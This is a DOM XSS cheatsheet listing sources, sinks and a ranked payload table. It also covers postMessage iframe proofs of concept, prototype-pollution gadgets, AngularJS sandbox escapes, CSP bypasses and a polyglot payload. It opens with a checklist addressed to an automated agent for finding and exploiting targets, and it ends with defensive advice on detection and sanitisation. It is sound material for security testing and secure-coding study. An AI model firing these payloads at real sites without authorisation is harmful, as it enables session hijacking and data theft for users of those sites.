# DOM XSS Cheatsheet (Practical + Deep Understanding)

---

## ⚡ Quick Reference (Agent: read this section first)

### Sources — check if user input reaches any of these
```
location.hash  location.search  location.href  location.pathname
document.URL  document.documentURI  document.baseURI  document.referrer
window.name  history.state  document.cookie  localStorage  sessionStorage
postMessage / event.data  ws.onmessage  fetch/XHR response body
```

### Sinks — dangerous if source data flows here
```
innerHTML  outerHTML  insertAdjacentHTML  document.write  document.writeln
eval  setTimeout  setInterval  Function()  new Function()
location=  location.href=  location.assign()  location.replace()
script.src=  element.setAttribute("href",...)  element.setAttribute("src",...)
$(...)  $().html()  $().append()  $().prepend()
dangerouslySetInnerHTML  v-html  [innerHTML] (Angular)
```

### Payloads — try in this order once source→sink path is confirmed

| # | Context | Payload |
|---|---------|--------|
| 1 | `innerHTML` / `outerHTML` | `<img src=x onerror=alert(1)>` |
| 2 | `innerHTML` (SVG wrapping) | `<svg><script>alert(1)<\/script></svg>` |
| 3 | `eval` / `Function` / `setTimeout` | `alert(1)` |
| 4 | `location=` / `location.href=` | `javascript:alert(1)` |
| 5 | `location=` URL-encoded | `javascript://%0aalert(1)` |
| 6 | `setAttribute("href", ...)` | `javascript:alert(1)` |
| 7 | `jQuery $(...)` selector | `<img src=x onerror=alert(1)>` |
| 8 | `location.hash` → jQuery | `#<img src=x onerror=alert(1)>` |
| 9 | JSON string breakout | `\"-alert(1)}//` |
| 10 | `postMessage` sink | Send `<img src=x onerror=alert(1)>` via iframe postMessage |
| 11 | Prototype pollution gadget | `?__proto__[template]=<img src=x onerror=alert(1)>` |
| 12 | AngularJS template | `{{constructor.constructor('alert(1)')()}}` |
| 13 | Polyglot | `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\_x3e` |

### Agent checklist
1. Grep source list in target JS → identify reachable sources.
2. Grep sink list → trace if source data flows to any sink.
3. Inject canary via source → confirm it appears in sink (DevTools / Burp DOM Invader).
4. Send matching payload from table above.
5. Validate `e.origin` check: if absent on `postMessage` → it is exploitable.

---

## 🧠 What is DOM XSS?
DOM XSS happens when:
- User-controlled data (source)
- Reaches a dangerous DOM/API (sink)
- Executes in the browser

---

## 🔥 Basic Flow

User Input → Source → Sink → Execution

---

## 🧩 Common SOURCES

### URL-based
- `location.hash`
- `location.search`
- `location.href`
- `location.pathname`
- `document.URL`
- `document.documentURI`
- `document.baseURI`

### Browser state
- `document.referrer`
- `window.name`
- `history.state`

### Storage
- `document.cookie`
- `localStorage`
- `sessionStorage`
- `indexedDB`

### Messaging
- `postMessage` / `message` event (`event.data`)
- WebSocket (`ws.onmessage` data)

### Network responses (fetch/XHR)
- Response body inserted into DOM without sanitization

---

## 💣 Dangerous SINKS

### Direct HTML injection
- `element.innerHTML = userInput`
- `element.outerHTML = userInput`
- `element.insertAdjacentHTML("beforeend", userInput)`
- `document.write(userInput)`
- `document.writeln(userInput)`

### JS execution
- `eval(userInput)`
- `setTimeout(userInput)`
- `setInterval(userInput)`
- `Function(userInput)()`
- `` new Function(`return ${userInput}`)() ``

### Attribute-based
- `element.setAttribute("href", userInput)`
- `element.setAttribute("src", userInput)`
- `element.setAttribute("action", userInput)`

Payload:
```
javascript:alert(1)
```

### Navigation sinks
- `location = userInput`
- `location.href = userInput`
- `location.assign(userInput)`
- `location.replace(userInput)`

### Script source injection
- `script.src = userInput`

### Template literal sinks
```js
element.innerHTML = `<div>${userInput}</div>`;
```

### React / framework-specific
- `dangerouslySetInnerHTML={{ __html: userInput }}`
- Vue `v-html` directive
- Angular `[innerHTML]` binding

---

## 🔴 jQuery Sink

```js
$(userInput)
$("body").html(userInput)   // .html() sink
$("div").append(userInput)  // .append() sink
$("div").prepend(userInput)
$("a").attr("href", userInput)
```

---

## 🔥 jQuery Selector XSS

Vulnerable:
```js
$(location.hash)
```

Payload:
```
#<img src=x onerror=alert(1)>
```

---

## 💣 Payload Collection

### Basic HTML injection
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
```

### Attribute injection
```
x" onerror="alert(1)
x' onerror='alert(1)
```

### JS URL
```
javascript:alert(document.domain)
javascript://%0aalert(1)
```

### For innerHTML / insertAdjacentHTML (script tag does NOT execute)
```
<img src=x onerror=alert(1)>
<svg><script>alert(1)</script></svg>
```

### Polyglot payload
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

---

## 🔥 JSON Escape Breakout

Code:
```js
var data = {"search":"USER_INPUT"};
```

Payload:
```
\"-alert(1)}//
```

Explanation:
- You inject `"`
- Server escapes again → `\\"`
- JS parses `\` → literal backslash
- Quote becomes free → string breaks
- `alert` executes

---

## 🧠 DOM XSS Variants

### Reflected DOM XSS
Server reflects input into JS that writes to the DOM:
```js
// Server renders:
var searchTerm = "USER_INPUT";
document.getElementById("out").innerHTML = searchTerm;
```
Unlike stored/reflected HTML XSS, the server does not directly inject into HTML — the JS does.

### Stored DOM XSS
Input is stored (DB, localStorage), later retrieved and written to DOM by client-side JS:
```js
const comment = localStorage.getItem("comment");
document.getElementById("comments").innerHTML = comment;
```

---

## 📨 postMessage-based DOM XSS

Vulnerable pattern:
```js
window.addEventListener("message", (e) => {
  document.getElementById("out").innerHTML = e.data; // no origin check + no sanitization
});
```

Attack PoC (from attacker page):
```html
<iframe src="https://victim.com" id="f" onload="
  f.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*')
"></iframe>
```

What to check:
- No `e.origin` validation
- `e.data` directly written to a sink
- `targetOrigin` is `*` on sender side

---

## 🧬 Prototype Pollution → XSS

Gadget chain example:
```js
// Somewhere in app:
Object.assign({}, userInput);  // pollutes Object.prototype

// Later, library reads:
let opts = {};
element.innerHTML = opts.template; // opts.template is now attacker-controlled via __proto__
```

Payload to pollute:
```
?__proto__[template]=<img src=x onerror=alert(1)>
```

Common gadget sources: lodash `merge`, jQuery `extend`, `Object.assign` with user input.

---

## 🔄 Mutation XSS (mXSS)

Browsers mutate HTML during parsing. A payload that appears safe can become dangerous after DOM serialization/re-parsing.

Example:
```js
// Sanitizer sees: <p id="x">safe</p>
// After innerHTML assignment and re-read:
el.innerHTML = sanitized;
anotherEl.innerHTML = el.innerHTML; // re-parsed HTML may differ
```

Classic mXSS vector:
```html
<listing><img src=x onerror=alert(1)></listing>
```

---

## 🏠 DOM Clobbering

Abusing named HTML elements to override `window` properties:

```html
<a id="defaultAvatar"><a id="defaultAvatar" name="avatar" href="cid:&quot;onerror=alert(1)//">
```

```js
// App code that reads window.defaultAvatar.avatar
let avatar = defaultAvatar.avatar;
img.src = avatar;  // → javascript:... or cid: payload
```

Key targets: `window.name`, `document.getElementById`, any global the app reads without null checks.

---

## 🅰️ AngularJS Template Injection (Sandbox Escape)

When Angular compiles unsanitized input as a template expression:

```
{{constructor.constructor('alert(1)')()}}
```

Bypass for older Angular sandbox:
```
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

Detection: Check for `ng-app` on the page without strict CSP.

---

## 🔎 Detection & Testing Methodology

### Manual approach
1. Find **sources**: grep for `location.`, `document.URL`, `postMessage`, `window.name`
2. Find **sinks**: grep for `innerHTML`, `eval`, `document.write`, `location =`
3. Trace data flow from source to sink
4. Inject canary string (e.g., `xsstest1234`) and observe DOM in DevTools

### Browser DevTools
- Use **Sources** tab breakpoints on sink functions
- **Event Listener Breakpoints** → DOM Mutation
- DOM search: `Ctrl+F` in Elements panel for your canary

### Burp Suite DOM Invader
- Enables automatic source → sink taint tracking
- Highlights reachable sinks with injected canary
- Use **Augmented DOM** mode for deep frame analysis

---

## 🤖 Automation Tools

| Tool | Purpose |
|------|---------|
| **Burp DOM Invader** | Browser-level taint tracking, canary injection |
| **dalfox** | Fast automated DOM/reflected XSS scanner |
| **xsstrike** | Context-aware XSS payload generation |
| **DOMinator Pro** | Runtime taint analysis via Firefox extension |
| **semgrep** | Static analysis for sink/source patterns |
| **CodeQL** | Deep taint tracking for JS codebases |
| **nuclei** (xss templates) | Template-based automated scanning |

### dalfox quick scan
```bash
dalfox url "https://target.com/page?q=test" --skip-bav
```

### Semgrep for innerHTML sinks
```bash
semgrep --config "p/javascript" --pattern 'document.getElementById(...).innerHTML = ...' ./src
```

---

## 🛡️ CSP Bypass Techniques (DOM XSS context)

| Bypass | Condition |
|--------|-----------|
| `unsafe-eval` present | `eval()` / `Function()` payloads work |
| `unsafe-inline` present | Inline event handlers work |
| Whitelisted CDN (e.g., `cdn.jsdelivr.net`) | Host JSONP/callback endpoints |
| `script-src 'nonce-...'` leak | Reuse leaked nonce |
| Angular + `unsafe-eval` | Template injection executes |
| `data:` allowed | `<iframe src="data:text/html,<script>alert(1)</script>">` |

---

## 🧠 Constructor Chain

```js
{}.constructor.constructor("alert(1)")()
```

Breakdown:
- `{}` → Object instance
- `Object.constructor` → `Function`
- `Function("alert(1)")()` → executes

Encoded variant:
```js
[].constructor.constructor`alert\x281\x29```
```

---

## 🔥 Selector Injection

Code:
```js
let el = $(userInput);
let data = el.val();
preview.innerHTML = data;
```

Attack:
```
input[name=csrf_token]
```

---

## 🧠 Mental Models

Wrong:
- Escaping is enough
- `$()` is safe
- `textContent` and `innerHTML` are interchangeable

Correct:
- Multiple parsing layers (HTML parser → JS engine → CSS engine)
- Data flow matters — trace every source
- Any parser is an attack surface
- `textContent` is safe; `innerHTML` is a sink
- Sanitizers (DOMPurify) must be applied **at the sink**, not at input time

---

## 🔥 Golden Rules

1. Never trust input
2. Track source → sink
3. Treat `$()` as a parser
4. Escaping is not security
5. Think in execution flow
6. Validate `origin` on every `postMessage` listener
7. Never store raw HTML in `localStorage` / cookies
8. Use `textContent` instead of `innerHTML` where possible
9. Apply DOMPurify **at the sink**, not on input receipt
10. CSP is a mitigation layer, not a fix

---

## 🚀 Final Thought

If you memorize payloads → you fail  
If you understand parsing → you win
